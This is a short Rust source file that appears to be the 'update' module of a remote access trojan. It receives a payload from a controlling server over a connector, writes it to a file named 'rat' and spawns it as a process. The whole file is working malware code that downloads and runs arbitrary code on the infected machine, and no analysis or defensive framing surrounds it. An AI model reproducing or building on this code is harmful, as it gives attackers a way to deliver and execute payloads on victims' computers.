use tokio::{fs, process::Command};

use crate::connector::Connector;

use super::{Feature, Result};

pub struct Update {
    name: String,
}
impl Feature for Update {
    fn get_command(&self) -> String {
        "update".to_string()
    }
    async fn run(&self, connector: &mut Connector) -> Result {
        let path_to_program = String::from("rat");
        fs::write(path_to_program.clone(), connector.accept_message().await)
            .await
            .unwrap();
        //launch it
        if let Ok(result) = Command::new(path_to_program).spawn() {
            println!("Started process with PID: {}", result.id().unwrap());
            //check if its running somehow idono
            Result::SUCCESFUL
        } else {
            Result::FAILED
        }
    }
}
impl Update {
    pub fn new() -> Update {
        Update {
            name: "update".to_string(),
        }
    }
}
